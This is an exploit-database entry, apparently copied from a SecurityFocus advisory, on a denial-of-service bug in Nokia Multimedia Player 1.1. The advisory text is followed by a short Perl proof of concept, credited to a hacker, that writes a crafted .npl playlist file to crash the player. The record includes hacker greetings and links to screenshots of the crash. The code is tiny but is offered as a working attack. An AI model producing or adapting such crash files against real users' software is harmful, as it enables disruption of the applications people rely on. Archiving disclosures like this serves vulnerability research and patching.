source: http://www.securityfocus.com/bid/36215/info

Nokia Multimedia Player is prone to a remote denial-of-service vulnerability.

An attacker can exploit this issue to cause the affected application to stop responding, denying service to legitimate users.

This issue affects Nokia Multimedia Player 1.1.

#[+] Discovered By   : Inj3ct0r
#[+] Site            : Inj3ct0r.com
#[+] support e-mail  : submit[at]inj3ct0r.com


#!/usr/bin/perl
#Nokia Multimedia Player 1.1 (.npl) Local Stack Overflow POC
#Finded by : opt!x hacker
#Download :
http://nds1.nokia.com/phones/files/software/nokia_multimedia_player_en.exe
#http://img136.imageshack.us/img136/6486/nokiai.png
#http://img19.imageshack.us/img19/2512/nokiacrash.png
#Greetz: H-RAF , his0k4
my $junk="A"x 4;
open(MYFILE,'>>nokia.npl');
print MYFILE $junk;
close(MYFILE);

